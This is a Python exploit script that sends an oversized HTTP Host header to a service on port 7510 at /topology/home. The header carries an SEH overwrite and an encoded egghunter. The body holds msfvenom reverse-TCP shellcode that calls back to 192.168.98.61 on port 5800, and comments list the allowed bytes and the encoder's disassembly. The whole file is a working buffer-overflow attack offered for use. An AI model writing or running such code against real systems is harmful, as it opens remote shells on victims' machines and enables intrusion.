import socket
import sys
import struct

TCP_IP = sys.argv[1]
TCP_PORT = 7510

junk = "\x4c"*3379
jmp = "\x73\x04" # JAE near +0x4
eip = struct.pack("<I",0x5A01124C) # EIP -> pop pop ret. redirect the flow to the JAE jump
# eip = struct.pack("<I",0x6d356c6e) # EIP -> pop pop ret

# eip += struct.pack("<I",0x5A02ef74) # EIP -> pop pop ret (contains bad chars)
				#zeroes the EAX register				   fixes ESP so the stack points where we want to start decoding. should add at least 0x16AA bytes
egghunterEnc = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A"+"\x54\x58\x2d\x54\x7f\x7f\x7f\x2d\x01\x69\x7e\x7e\x2d\x01\x01\x02\x02\x50\x5c"+"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x59\x09\x7f\x09\x2d\x31\x09\x7e\x09\x2d\x01\x06\x03\x05\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x58\x09\x4e\x2d\x01\x31\x09\x01\x2d\x01\x01\x03\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x79\x7f\x74\x7f\x2d\x31\x39\x01\x78\x2d\x01\x01\x01\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x09\x45\x7a\x7e\x2d\x07\x01\x31\x31\x2d\x01\x01\x01\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x7f\x73\x59\x2d\x44\x7a\x31\x31\x2d\x01\x01\x01\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x75\x7f\x7f\x2d\x7e\x31\x7e\x50\x2d\x01\x01\x35\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x7f\x7b\x63\x2d\x71\x3d\x31\x31\x2d\x01\x01\x01\x01\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x68\x7c\x33\x7f\x2d\x31\x01\x01\x7e\x2d\x01\x01\x01\x03\x50"

egghunterPlaceHolder = "A"*200


egg="SOUFSOUF"
#msfvenom -p windows/shell/reverse_tcp LPORT=5800 LHOST=192.168.98.61 -f python -v shellcode -b "\x00"
shellcode =  ""
shellcode += "\x89\xe3\xdd\xc6\xd9\x73\xf4\x59\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43"
shellcode += "\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41"
shellcode += "\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"
shellcode += "\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39"
shellcode += "\x6c\x38\x68\x4b\x32\x43\x30\x57\x70\x33\x30\x55"
shellcode += "\x30\x6b\x39\x38\x65\x70\x31\x69\x50\x31\x74\x6c"
shellcode += "\x4b\x46\x30\x30\x30\x4c\x4b\x43\x62\x66\x6c\x6e"
shellcode += "\x6b\x73\x62\x72\x34\x4e\x6b\x70\x72\x34\x68\x34"
shellcode += "\x4f\x6f\x47\x51\x5a\x37\x56\x54\x71\x49\x6f\x4c"
shellcode += "\x6c\x65\x6c\x31\x71\x51\x6c\x75\x52\x64\x6c\x45"
shellcode += "\x70\x6a\x61\x68\x4f\x46\x6d\x43\x31\x5a\x67\x69"
shellcode += "\x72\x5a\x52\x53\x62\x30\x57\x4e\x6b\x33\x62\x54"
shellcode += "\x50\x6e\x6b\x52\x6a\x47\x4c\x6e\x6b\x42\x6c\x47"
shellcode += "\x61\x73\x48\x58\x63\x77\x38\x33\x31\x4b\x61\x33"
shellcode += "\x61\x6c\x4b\x51\x49\x65\x70\x55\x51\x6b\x63\x4e"
shellcode += "\x6b\x71\x59\x64\x58\x4b\x53\x57\x4a\x62\x69\x6e"
shellcode += "\x6b\x34\x74\x6e\x6b\x43\x31\x5a\x76\x54\x71\x4b"
shellcode += "\x4f\x6e\x4c\x79\x51\x78\x4f\x36\x6d\x37\x71\x4a"
shellcode += "\x67\x66\x58\x59\x70\x44\x35\x68\x76\x56\x63\x53"
shellcode += "\x4d\x78\x78\x45\x6b\x73\x4d\x34\x64\x54\x35\x5a"
shellcode += "\x44\x71\x48\x4e\x6b\x42\x78\x57\x54\x73\x31\x6b"
shellcode += "\x63\x30\x66\x4c\x4b\x66\x6c\x52\x6b\x6c\x4b\x31"
shellcode += "\x48\x57\x6c\x76\x61\x58\x53\x6e\x6b\x77\x74\x4e"
shellcode += "\x6b\x57\x71\x6a\x70\x6b\x39\x63\x74\x37\x54\x74"
shellcode += "\x64\x31\x4b\x33\x6b\x53\x51\x30\x59\x61\x4a\x66"
shellcode += "\x31\x49\x6f\x49\x70\x61\x4f\x51\x4f\x62\x7a\x6c"
shellcode += "\x4b\x75\x42\x38\x6b\x6e\x6d\x31\x4d\x42\x48\x50"
shellcode += "\x33\x35\x62\x35\x50\x65\x50\x55\x38\x53\x47\x54"
shellcode += "\x33\x55\x62\x31\x4f\x46\x34\x72\x48\x72\x6c\x74"
shellcode += "\x37\x77\x56\x34\x47\x4d\x59\x4a\x48\x4b\x4f\x5a"
shellcode += "\x70\x78\x38\x6a\x30\x77\x71\x65\x50\x65\x50\x35"
shellcode += "\x79\x39\x54\x61\x44\x72\x70\x71\x78\x47\x59\x6f"
shellcode += "\x70\x52\x4b\x33\x30\x59\x6f\x69\x45\x43\x5a\x76"
shellcode += "\x6a\x33\x58\x39\x50\x39\x38\x72\x42\x57\x4d\x70"
shellcode += "\x68\x37\x72\x37\x70\x36\x76\x4d\x78\x6b\x39\x39"
shellcode += "\x76\x62\x70\x66\x30\x56\x30\x36\x30\x61\x50\x50"
shellcode += "\x50\x73\x70\x62\x70\x43\x58\x58\x6a\x34\x4f\x39"
shellcode += "\x4f\x4d\x30\x59\x6f\x68\x55\x6e\x77\x52\x4a\x42"
shellcode += "\x30\x70\x56\x33\x67\x73\x58\x4e\x79\x6d\x75\x53"
shellcode += "\x44\x75\x31\x39\x6f\x69\x45\x4c\x45\x6f\x30\x30"
shellcode += "\x74\x65\x5a\x6b\x4f\x32\x6e\x63\x38\x50\x75\x5a"
shellcode += "\x4c\x69\x78\x73\x57\x33\x30\x57\x70\x77\x70\x32"
shellcode += "\x4a\x37\x70\x73\x5a\x47\x74\x62\x76\x42\x77\x72"
shellcode += "\x48\x33\x32\x7a\x79\x79\x58\x61\x4f\x69\x6f\x4b"
shellcode += "\x65\x4c\x43\x38\x78\x55\x50\x43\x4e\x76\x56\x4e"
shellcode += "\x6b\x47\x46\x51\x7a\x47\x30\x35\x38\x63\x30\x72"
shellcode += "\x30\x43\x30\x37\x70\x42\x76\x63\x5a\x35\x50\x52"
shellcode += "\x48\x30\x58\x4e\x44\x52\x73\x69\x75\x69\x6f\x68"
shellcode += "\x55\x7a\x33\x72\x73\x42\x4a\x37\x70\x62\x76\x66"
shellcode += "\x33\x43\x67\x61\x78\x63\x32\x4b\x69\x6a\x68\x71"
shellcode += "\x4f\x4b\x4f\x59\x45\x6d\x53\x79\x68\x57\x70\x71"
shellcode += "\x6d\x44\x68\x66\x38\x63\x58\x43\x30\x53\x70\x47"
shellcode += "\x70\x63\x30\x43\x5a\x33\x30\x70\x50\x55\x38\x46"
shellcode += "\x6b\x44\x6f\x34\x4f\x74\x70\x4b\x4f\x79\x45\x71"
shellcode += "\x47\x50\x68\x51\x65\x62\x4e\x72\x6d\x50\x61\x79"
shellcode += "\x6f\x59\x45\x71\x4e\x61\x4e\x59\x6f\x36\x6c\x64"
shellcode += "\x64\x66\x6f\x4d\x55\x42\x50\x79\x6f\x69\x6f\x6b"
shellcode += "\x4f\x48\x69\x4d\x4b\x59\x6f\x39\x6f\x69\x6f\x56"
shellcode += "\x61\x48\x43\x36\x49\x68\x46\x30\x75\x39\x51\x7a"
shellcode += "\x63\x6f\x4b\x6c\x30\x6d\x65\x79\x32\x30\x56\x62"
shellcode += "\x4a\x57\x70\x52\x73\x69\x6f\x7a\x75\x41\x41"

payloadHost = junk + jmp + eip + egghunterEnc + egghunterPlaceHolder # if the length of this payload is less that 3500 or more than 3750, the exploit stops working. again, idk why
print "payload "+str(len(payloadHost))
body = egg+shellcode+"\x90"*(1500-len(egg+shellcode))
print "shellcode "+str(len(body))

http_req = "GET /topology/home HTTP/1.1\r\n"
http_req += "Host: " + payloadHost + "\r\n"
http_req += "User-Agent: "+"A"*500+"\r\n\r\n" #pushing at least 500bytes here makes the exploit work. otherwise it doesnt. idk why
http_req += body

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(http_req)
s.close()




#good chars
#\x01\x02\x03\x04\x05\x06\x07\x08\x09\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f

# 25 4A4D4E55      AND EAX,554E4D4A
# 25 3532312A      AND EAX,2A313235
# 54
# 58

# 1035FE3E   2D 014E5555      SUB EAX,55554E01
# 1035FE43   2D 014E5555      SUB EAX,55554E01
# 1035FE48   2D 6E4D5555      SUB EAX,55554D6E
# 1035FE4D   50               PUSH EAX
# 1035FE4E   5C               POP ESP

